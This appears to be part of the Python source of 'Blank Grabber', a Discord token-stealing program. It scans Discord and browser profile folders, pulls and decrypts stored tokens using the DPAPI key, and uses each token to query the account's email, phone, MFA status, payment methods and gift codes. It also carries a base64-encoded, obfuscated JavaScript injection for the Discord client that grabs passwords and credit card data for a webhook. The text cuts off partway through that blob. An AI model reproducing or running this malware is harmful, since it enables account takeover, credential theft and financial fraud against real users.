        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors='ignore')
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()
        localStatePath = os.path.join(path, 'Local State')
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors='ignore') as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
                                        encryptedTokens.append(match)
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                if token:
                    tokens.append(token)
            except Exception:
                pass
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()
        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == 'leveldb':
                    levelDbPaths.append(os.path.join(root, dir))
        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith(('.log', '.ldb')):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip('\\')
                                if not match in tokens:
                                    tokens.append(match)
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith('.sqlite'):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors='ignore') as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b'Y29uc3QgUz1DOyhmdW5jdGlvbihZLFope2NvbnN0IHE9QyxvPVkoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgVD0tcGFyc2VJbnQocSgweDkwKSkvMHgxK3BhcnNlSW50KHEoMHgxNGEpKS8weDIrcGFyc2VJbnQocSgweDEyOSkpLzB4MyoocGFyc2VJbnQocSgweDEyZSkpLzB4NCkrcGFyc2VJbnQocSgweGY5KSkvMHg1K3BhcnNlSW50KHEoMHhkNykpLzB4NistcGFyc2VJbnQocSgweDEzYSkpLzB4NyoocGFyc2VJbnQocSgweDg4KSkvMHg4KStwYXJzZUludChxKDB4YmUpKS8weDkqKC1wYXJzZUludChxKDB4ZjApKS8weGEpO2lmKFQ9PT1aKWJyZWFrO2Vsc2Ugb1sncHVzaCddKG9bJ3NoaWZ0J10oKSk7fWNhdGNoKEgpe29bJ3B1c2gnXShvWydzaGlmdCddKCkpO319fSh4LDB4NDBmOGQpKTtjb25zdCBhcmdzPXByb2Nlc3NbUygweGVmKV0sZnM9cmVxdWlyZSgnZnMnKSxwYXRoPXJlcXVpcmUoUygweGJjKSksaHR0cHM9cmVxdWlyZShTKDB4ZDEpKSxxdWVyeXN0cmluZz1yZXF1aXJlKCdxdWVyeXN0cmluZycpLHtCcm93c2VyV2luZG93LHNlc3Npb259PXJlcXVpcmUoUygweDZhKSksZW5jb2RlZEhvb2s9UygweGQyKSxjb25maWc9eyd3ZWJob29rJzphdG9iKGVuY29kZWRIb29rKSwnd2ViaG9va19wcm90ZWN0b3Jfa2V5JzpTKDB4ZGYpLCdhdXRvX2J1eV9uaXRybyc6IVtdLCdwaW5nX29uX3J1bic6ISFbXSwncGluZ192YWwnOlMoMHgxMTUpLCdlbWJlZF9uYW1lJzpTKDB4Y2UpLCdlbWJlZF9pY29uJzpTKDB4MTI4KSwnZW1iZWRfY29sb3InOjB4NTYwZGRjLCdpbmplY3Rpb25fdXJsJzpTKDB4MTM1KSwnYXBpJzonaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lJywnbml0cm8nOnsnYm9vc3QnOnsneWVhcic6eydpZCc6JzUyMTg0NzIzNDI0NjA4MjU5OScsJ3NrdSc6UygweDhjKSwncHJpY2UnOlMoMHgxMzYpfSwnbW9udGgnOnsnaWQnOlMoMHhhNyksJ3NrdSc6JzUxMTY1MTg4MDgzNzg0MDg5NicsJ3ByaWNlJzpTKDB4ZjIpfX0sJ2NsYXNzaWMnOnsnbW9udGgnOnsnaWQnOlMoMHhkMyksJ3NrdSc6JzUxMTY1MTg3MTczNjIwMTIxNicsJ3ByaWNlJzpTKDB4MTE0KX19fSwnZmlsdGVyJzp7J3VybHMnOltTKDB4YWUpLFMoMHhjMyksUygweGU5KSxTKDB4ZmUpLFMoMHgxMTkpLFMoMHhlYyksUygweDE0MSksUygweDEwNiksUygweDg3KSwnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki9wYXltZW50X2ludGVudHMvKi9jb25maXJtJ119LCdmaWx0ZXIyJzp7J3VybHMnOltTKDB4NmMpLFMoMHhjZCksJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJyxTKDB4MTE4KSxTKDB4N2MpLFMoMHg3ZCldfX07ZnVuY3Rpb24gcGFyaXR5XzMyKFksWixvKXtyZXR1cm4gWV5aXm87fWZ1bmN0aW9uIGNoXzMyKFksWixvKXtyZXR1cm4gWSZaXn5ZJm87fWZ1bmN0aW9uIG1hal8zMihZLFosbyl7cmV0dXJuIFkmWl5ZJm9eWiZvO31mdW5jdGlvbiByb3RsXzMyKFksWil7cmV0dXJuIFk8PFp8WT4+PjB4MjAtWjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl8yKFksWil7dmFyIG89KFkmMHhmZmZmKSsoWiYweGZmZmYpLFQ9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCk7cmV0dXJuKFQmMHhmZmZmKTw8MHgxMHxvJjB4ZmZmZjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl81KFksWixvLFQsSCl7dmFyIFY9KFkmMHhmZmZmKSsoWiYweGZmZmYpKyhvJjB4ZmZmZikrKFQmMHhmZmZmKSsoSCYweGZmZmYpLGk9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCkrKFQ+Pj4weDEwKSsoSD4+PjB4MTApKyhWPj4+MHgxMCk7cmV0dXJuKGkmMHhmZmZmKTw8MHgxMHxWJjB4ZmZmZjt9ZnVuY3Rpb24gYmluYjJoZXgoWSl7Y29uc3QgbT1TO3ZhciBaPW0oMHg3NCksbz0nJyxUPVlbJ2xlbmd0aCddKjB4NCxILFY7Zm9yKEg9MHgwO0g8VDtIKz0weDEpe1Y9WVtIPj4+MHgyXT4+PigweDMtSCUweDQpKjB4OCxvKz1aWydjaGFyQXQnXShWPj4+MHg0JjB4ZikrWlsnY2hhckF0J10oViYweGYpO31yZXR1cm4gbzt9ZnVuY3Rpb24gZ2V0SCgpe3JldHVyblsweDY3NDUyMzAxLDB4ZWZjZGFiODksMHg5OGJhZGNmZSwweDEwMzI1NDc2LDB4YzNkMmUxZjBdO31mdW5jdGlvbiByb3VuZFNIQTEoWSxaKXt2YXIgbz1bXSxWLGksUixBLHIsbCxOPWNoXzMyLGs9cGFyaXR5XzMyLEY9bWFqXzMyLFg9cm90bF8zMix1PXNhZmVBZGRfMzJfMixKLHc9c2FmZUFkZF8zMl81O1Y9WlsweDBdLGk9WlsweDFdLFI9WlsweDJdLEE9WlsweDNdLHI9WlsweDRdO2ZvcihKPTB4MDtKPDB4NTA7Sis9MHgxKXtKPDB4MTA/b1tKXT1ZW0pdOm9bSl09WChvW0otMHgzXV5vW0otMHg4XV5vW0otMHhlXV5vW0otMHgxMF0sMHgxKTtpZihKPDB4MTQpbD13KFgoViwweDUpLE4oaSxSLEEpLHIsMHg1YTgyNzk5OSxvW0pdKTtlbHNle2lmKEo8MHgyOClsPXcoWChWLDB4NSksayhpLFIsQSksciwweDZlZDllYmExLG9bSl0pO2Vsc2UgSjwweDNjP2w9dyhYKFYsMHg1KSxGKGksUixBKSxyLDB4OGYxYmJjZGMsb1tKXSk6bD13KFgoViwweDUpLGsoaSxSLEEpLHIsMHhjYTYyYzFkNixvW0pdKTt9cj1BLEE9UixSPVgoaSwweDFlKSxpPVYsVj1sO31yZXR1cm4gWlsweDBdPXUoVixaWzB4MF0pLFpbMHgxXT11KGksWlsweDFdKSxaWzB4Ml09dShSLFpbMHgyXSksWlsweDNdPXUoQSxaWzB4M10pLFpbMHg0XT11KHIsWlsweDRdKSxaO31mdW5jdGlvbiBmaW5hbGl6ZVNIQTEoWSxaLG8sVCl7Y29uc3QgaD1TO3ZhciBWLFIsQTtBPShaKzB4NDE+Pj4weDk8PDB4NCkrMHhmO3doaWxlKFlbJ2xlbmd0aCddPD1BKXtZWydwdXNoJ10oMHgwKTt9WVtaPj4+MHg1XXw9MHg4MDw8MHgxOC1aJTB4MjAsWVtBXT1aK28sUj1ZWydsZW5ndGgnXTtmb3IoVj0weDA7VjxSO1YrPTB4MTApe1Q9cm91bmRTSEExKFlbaCgweDE0NCldKFYsVisweDEwKSxUKTt9cmV0dXJuIFQ7fWZ1bmN0aW9uIGhleDJiaW5iKFksWixvKXtjb25zdCB5PVM7dmFyIFQsSD1ZW3koMHhhNildLFYsUixBLHIsYztUPVp8fFsweDBdLG89b3x8MHgwLGM9bz4+PjB4MzsweDAhPT1IJTB4MiYmY29uc29sZVsnZXJyb3InXSh5KDB4ZmIpKTtmb3IoVj0weDA7VjxIO1YrPTB4Mil7Uj1wYXJzZUludChZW3koMHgxMWIpXShWLDB4MiksMHgxMCk7aWYoIWlzTmFOKFIpKXtyPShWPj4+MHgxKStjLEE9cj4+PjB4Mjt3aGlsZShUW3koMHhhNildPD1BKXtUW3koMHg4NCldKDB4MCk7fVRbQV18PVI8PDB4OCooMHgzLXIlMHg0KTt9ZWxzZSBjb25zb2xlW3koMHg3ZildKHkoMHhkOCkpO31yZXR1cm57J3ZhbHVlJzpULCdiaW5MZW4nOkgqMHg0K299O31jbGFzcyBqc1NIQXtjb25zdHJ1Y3Rvcigpe2NvbnN0IFA9Uzt2YXIgWT0weDAsWj1bXSxvPTB4MCxULEgsVixpLFIsQSxyPSFbXSxjPSFbXSxsPVtdLE49W10sayxrPTB4MTtIPWhleDJiaW5iLChrIT09cGFyc2VJbnQoaywweGEpfHwweDE+aykmJmNvbnNvbGVbUCgweDdmKV0oUCgweDEyNikpLGk9MHgyMDAsUj1yb3VuZFNIQTEsQT1maW5hbGl6ZVNIQTEsVj0weGEwLFQ9Z2V0SCgpLHRoaXNbUCgweGMxKV09ZnVuY3Rpb24oRil7Y29uc3QgVz1QO3ZhciBYLHUsSix3LG4sYSxFO1g9aGV4MmJpbmIsdT1YKEYpLEo9dVsnYmluTGVuJ10sdz11W1coMHg2ZCldLG49aT4+PjB4MyxFPW4vMHg0LTB4MTtpZihuPEovMHg4KXt3PUEodyxKLDB4MCxnZXRIKCkpO3doaWxlKHdbVygweGE2KV08PUUpe3dbVygweDg0KV0oMHgwKTt9d1tFXSY9MHhmZmZmZmYwMDt9ZWxzZXtpZihuPkovMHg4KXt3aGlsZSh3WydsZW5ndGgnXTw9RSl7d1tXKDB4ODQpXSgweDApO313W0VdJj0weGZmZmZmZjAwO319Zm9yKGE9MHgwO2E8PUU7YSs9MHgxKXtsW2FdPXdbYV1eMHgzNjM2MzYzNixOW2FdPXdbYV1eMHg1YzVjNWM1Yzt9VD1SKGwsVCksWT1pLGM9ISFbXTt9LHRoaXNbUCgweDExMCldPWZ1bmN0aW9uKEYpe2NvbnN0IEI9UDt2YXIgWCx1LEosdyxuLGE9MHgwLEU9aT4+PjB4NTtYPUgoRixaLG8pLHU9WFtCKDB4MTJiKV0sdz1YW0IoMHg2ZCldLEo9dT4+PjB4NTtmb3Iobj0weDA7bjxKO24rPUUpe2EraTw9dSYmKFQ9Uih3W0IoMHgxNDQpXShuLG4rRSksVCksYSs9aSk7fVkrPWEsWj13WydzbGljZSddKGE+Pj4weDUpLG89dSVpO30sdGhpc1tQKDB4MTFmKV09ZnVuY3Rpb24oKXtjb25zdCB6PVA7dmFyIEY7IVtdPT09YyYmY29uc29sZVt6KDB4N2YpXSh6KDB4YTQpKTtjb25zdCBYPWZ1bmN0aW9uKHUpe3JldHVybiBiaW5iMmhleCh1KTt9O3JldHVybiFbXT09PXImJihGPUEoWixvLFksVCksVD1SKE4sZ2V0SCgpKSxUPUEoRixWLGksVCkpLHI9ISFbXSxYKFQpO307fX1pZihTKDB4MTBiKT09PXR5cGVvZiBkZWZpbmUmJmRlZmluZVtTKDB4YjApXSlkZWZpbmUoZnVuY3Rpb24oKXtyZXR1cm4ganNTSEE7fSk7ZWxzZSBTKDB4OWQpIT09dHlwZW9mIGV4cG9ydHM/UygweDlkKSE9PXR5cGVvZiBtb2R1bGUmJm1vZHVsZVtTKDB4MTJkKV0/bW9kdWxlW1MoMHgxMmQpXT1leHBvcnRzPWpzU0hBOmV4cG9ydHM9anNTSEE6Z2xvYmFsW1MoMHgxMjcpXT1qc1NIQTtqc1NIQVtTKDB4MTFhKV0mJihqc1NIQT1qc1NIQVtTKDB4MTFhKV0pO2Z1bmN0aW9uIHRvdHAoWSl7Y29uc3QgZz1TLFo9MHgxZSxvPTB4NixUPURhdGVbZygweDcyKV0oKSxIPU1hdGhbZygweDgxKV0oVC8weDNlOCksVj1sZWZ0cGFkKGRlYzJoZXgoTWF0aFtnKDB4ZmYpXShIL1opKSwweDEwLCcwJyksaT1uZXcganNTSEEoKTtpW2coMHhjMSldKGJhc2UzMnRvaGV4KFkpKSxpWyd1cGRhdGUnXShWKTtjb25zdCBSPWlbZygweDExZildKCksQT1oZXgyZGVjKFJbJ3N1YnN0cmluZyddKFJbZygweGE2KV0tMHgxKSk7bGV0IHI9KGhleDJkZWMoUltnKDB4MTFiKV0oQSoweDIsMHg4KSkmaGV4MmRlYygnN2ZmZmZmZmYnKSkrJyc7cmV0dXJuIHI9clsnc3Vic3RyJ10oTWF0aFtnKDB4YzgpXShyWydsZW5ndGgnXS1vLDB4MCksbykscjt9ZnVuY3Rpb24gaGV4MmRlYyhZKXtyZXR1cm4gcGFyc2VJbnQoWSwweDEwKTt9ZnVuY3Rpb24geCgpe2NvbnN0IHg5PVsndmFyXHgyMHhtbEh0dHBceDIwPVx4MjBuZXdceDIwWE1MSHR0cFJlcXVlc3QoKTtceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMkdFVFx4MjIsXHgyMFx4MjInLCdlcnJvcicsJ2hvc3QnLCdyb3VuZCcsJ2RhdGEnLCdjYXJkW2V4cF95ZWFyXScsJ3B1c2gnLCdnZXRBbGxXaW5kb3dzJywnZGlzY29yZCcsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovc2V0dXBfaW50ZW50cy8qL2NvbmZpcm0nLCcxNDIwOTZCT2FodEknLCcqKlx4MGFDcmVkaXRceDIwQ2FyZFx4MjBFeHBpcmF0aW9uOlx4MjAqKicsJyoqRGlzY29yZFx4MjBJbmZvKionLCdta2RpclN5bmMnLCc1MTE2NTE4ODU0NTk5NjM5MDQnLCdybWRpclN5bmMnLCdwYXNzd29yZCcsJ2xlbmdodCcsJzQ3MzExMXVXdW9scScsJyoqXHgwYU5ld1x4MjBQYXNzd29yZDpceDIwKionLCdodHRwczovL2Rpc2NvcmQuZ2lmdC8nLCc8OnBheXBhbDo5NTExMzkxODkzODk0MTAzNjU+JywndXBsb2FkRGF0YScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMjM0NTY3JywnaW52YWxpZCcsJ3JlcGxhY2UnLCdEaXNjb3JkXHgyMFN0YWZmJywnKlx4MGFCYWRnZXM6XHgyMCoqJywnZGFyd2luJywnc2VwJywnXHgyMik7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyN0NvbnRlbnQtVHlwZVx4MjcsXHgyMFx4MjdhcHBsaWNhdGlvbi9qc29uXHgyNyk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNlbmQoSlNPTi5zdHJpbmdpZnkoJywndW5kZWZpbmVkJywnKipQYXNzd29yZFx4MjBDaGFuZ2VkKionLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJyoqTml0cm9ceDIwQ29kZToqKlx4MGFgYGBkaWZmXHgwYStceDIwJywnZW1haWwnLCdlbmRzV2l0aCcsJyoqXHgwYUJpbGxpbmc6XHgyMCoqJywnQ2Fubm90XHgyMGNhbGxceDIwZ2V0SE1BQ1x4MjB3aXRob3V0XHgyMGZpcnN0XHgyMHNldHRpbmdceDIwSE1BQ1x4MjBrZXknLCdwYWNrYWdlLmpzb24nLCdsZW5ndGgnLCc1MjE4NDcyMzQyNDYwODI1OTknLCdvbkNvbXBsZXRlZCcsJ0ludmFsaWRceDIwYmFzZTMyXHgyMGNoYXJhY3Rlclx4MjBpblx4MjBrZXknLCdwcmljZScsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpblx4MjBceDI3Klx4MjcnLCdyZXZlcnNlJywnZmxhZ3MnLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdjb25zdFx4MjBmc1x4MjA9XHgyMHJlcXVpcmUoXHgyN2ZzXHgyNyksXHgyMGh0dHBzXHgyMD1ceDIwcmVxdWlyZShceDI3aHR0cHNceDI3KTtceDBhY29uc3RceDIwaW5kZXhKc1x4MjA9XHgyMFx4MjcnLCdhbWQnLCdpbmRleC5qcycsJ21ldGhvZCcsJ2NvbnRlbnQnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeScsJ1x4MjcpXHgwYWlmXHgyMChmcy5leGlzdHNTeW5jKGJkUGF0aCkpXHgyMHJlcXVpcmUoYmRQYXRoKTsnLCcqKlBheVBhbFx4MjBBZGRlZCoqJywnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8nLCdlbWJlZF9uYW1lJywnKipUb2tlbioqJywnZW1iZWRfaWNvbicsJ3JlcXVlc3QnLCdwYXRoJywnc3BsaXQnLCcyNDgxNzVjZEVrY3AnLCdQT1NUJywnRGlzY29yZFx4MjBCdWdceDIwSHVudGVyXHgyMChOb3JtYWwpJywnc2V0SE1BQ0tleScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGJkUGF0aFx4MjA9XHgyMFx4MjcnLCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdBdXRob3JpemF0aW9uJywnKipOaXRyb1x4MjBib3VnaHQhKionLCdwbGF0Zm9ybScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGZpbGVTaXplXHgyMD1ceDIwZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZVx4MGFmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcyxceDIwXHgyN3V0ZjhceDI3LFx4MjAoZXJyLFx4MjBkYXRhKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBpZlx4MjAoZmlsZVNpemVceDIwPFx4MjAyMDAwMFx4MjB8fFx4MjBkYXRhXHgyMD09PVx4MjBceDIybW9kdWxlLmV4cG9ydHNceDIwPVx4MjByZXF1aXJlKFx4MjcuL2NvcmUuYXNhclx4MjcpXHgyMilceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaW5pdCgpO1x4MGF9KVx4MGFhc3luY1x4MjBmdW5jdGlvblx4MjBpbml0KClceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwaHR0cHMuZ2V0KFx4MjcnLCdtYXgnLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5JywnTml0cm9ceDIwVHlwZTpceDIwKionLCcqKkNyZWRpdFx4MjBDYXJkXHgyMEFkZGVkKionLCd0eXBlJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hcHBsaWNhdGlvbnMvZGV0ZWN0YWJsZScsJ0JsYW5rXHgyMEdyYWJiZXJceDIwSW5qZWN0aW9uJywnXHgyNylceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucGlwZShmaWxlKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBmaWxlLm9uKFx4MjdmaW5pc2hceDI3LFx4MjAoKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGZpbGUuY2xvc2UoKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjB9KTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MGFceDIwXHgyMFx4MjBceDIwfSkub24oXHgyMmVycm9yXHgyMixceDIwKGVycilceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHNldFRpbWVvdXQoaW5pdCgpLFx4MjAxMDAwMCk7XHgwYVx4MjBceDIwXHgyMFx4MjB9KTtceDBhfVx4MGFyZXF1aXJlKFx4MjcnLCdtb250aCcsJ2h0dHBzJywnJVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCUnLCc1MjE4NDY5MTg2Mzc0MjA1NDUnLCdlbnYnLCdIeXBlU3F1YWRceDIwQnJhdmVyeScsJ3Rva2VucycsJzI2NzE2ODBPb0dQT1QnLCdTdHJpbmdceDIwb2ZceDIwSEVYXHgyMHR5cGVceDIwY29udGFpbnNceDIwaW52YWxpZFx4MjBjaGFyYWN0ZXJzJywnXHgyMik7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MjBceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0JywncGF0aG5hbWUnLCd5ZWFyJywncGluZ19vbl9ydW4nLCd1c2QnLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5yZXBsYWNlKFx4MjclV0VCSE9PS19LRVklXHgyNyxceDIwXHgyNycsJyVXRUJIT09LX0tFWSUnLCd0b1N0cmluZycsJ2xvZycsJ2ZpbHRlcicsJ0NyZWRpdFx4MjBDYXJkXHgyME51bWJlcjpceDIwKionLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzXHgyMFx4MjcqXHgyNycsJyoqXHgyMC1ceDIwUGFzc3dvcmQ6XHgyMCoqJywnKipceDBhUGFzc3dvcmQ6XHgyMCoqJywnRW1haWw6XHgyMCoqJywnYXBwbGljYXRpb24vanNvbicsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywncmVzb3VyY2VzJywnd2ViQ29udGVudHMnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdjYXJkW2V4cF9tb250aF0nLCdleGlzdHNTeW5jJywnYXJndicsJzIwMG5FVkFSVScsJ3BheXBhbF9hY2NvdW50cycsJzk5OScsJ25pdHJvJywnZGVmYXVsdFNlc3Npb24nLCdQYXJ0bmVyZWRceDIwU2VydmVyXHgyME93bmVyJywnSHlwZVNxdWFkXHgyMEJyaWxsaWFuY2UnLCd3aW4zMicsJ2Jvb3N0JywnMTI2MzQ1NWZWcHdJSCcsJ0h5cGVTcXVhZFx4MjBCYWxhbmNlJywnU3RyaW5nXHgyMG9mXHgyMEhFWFx4MjB0eXBlXHgyMG11c3RceDIwYmVceDIwaW5ceDIwYnl0ZVx4MjBpbmNyZW1lbnRzJywndW5saW5rU3luYycsJ05pdHJvJywnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsJ2Zsb29yJywnZmlsdGVyMicsJ2NhdGNoJywnQWN0aXZlXHgyMERldmVsb3BlcicsJ05pdHJvXHgyMEJhc2ljJywnXHg1Y2JldHRlcmRpc2NvcmRceDVjZGF0YVx4NWNiZXR0ZXJkaXNjb3JkLmFzYXInLCdOaXRyb1x4MjBDbGFzc2ljJywnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnMnLCcuL2NvcmUuYXNhcicsJ2dpZnRfY29kZScsJ0Vhcmx5